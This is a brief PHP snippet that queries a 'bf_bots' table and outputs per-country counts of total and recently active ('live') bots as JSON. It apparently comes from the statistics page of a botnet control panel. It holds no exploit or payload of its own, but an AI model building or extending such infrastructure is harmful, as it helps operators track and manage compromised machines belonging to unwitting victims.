
$live_bot_all = 0;
$count_bot_all = 0;

$bots = array();
$live_bot = array();

$result = $mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots WHERE (last_date > \''.(time()-600).'\') GROUP by country ORDER by count');

while($row = $result->fetch_object()){
	$live_bot[$row->country] = $row->count;
}

$result = $mysqli->query('SELECT DISTINCT(country) country, COUNT(country) count FROM bf_bots GROUP by country ORDER by count DESC');

while($row = $result->fetch_object()){
	if(empty($live_bot[$row->country]) || $live_bot[$row->country] <= 0) {
		$row->live_bot = 0;
	}else{
		$row->live_bot = $live_bot[$row->country];
		$live_bot_all += $live_bot[$row->country];
	}

	$count_bot_all += $row->count;

	$bots[] = $row;
}

print(json_encode($bots));